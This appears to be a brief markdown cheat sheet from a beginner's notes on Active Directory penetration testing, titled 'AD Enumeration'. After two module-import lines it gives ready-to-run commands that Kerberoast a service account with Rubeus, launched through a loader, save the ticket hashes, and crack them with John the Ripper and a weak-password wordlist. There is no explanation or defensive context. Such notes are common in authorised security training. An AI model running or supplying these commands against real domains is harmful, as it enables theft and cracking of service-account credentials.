---
title: AD Enumeration
draft: false
tags:
  - example-tag
enableToc: true
---

This is for newbiews to understand Active Directory Testing.

## Enumeration on users,computers.

### Active Directory CheatSheet


Import-Module C:\AD\Tools\ADModule-
master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1


 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:serviceaccount /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt

  C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
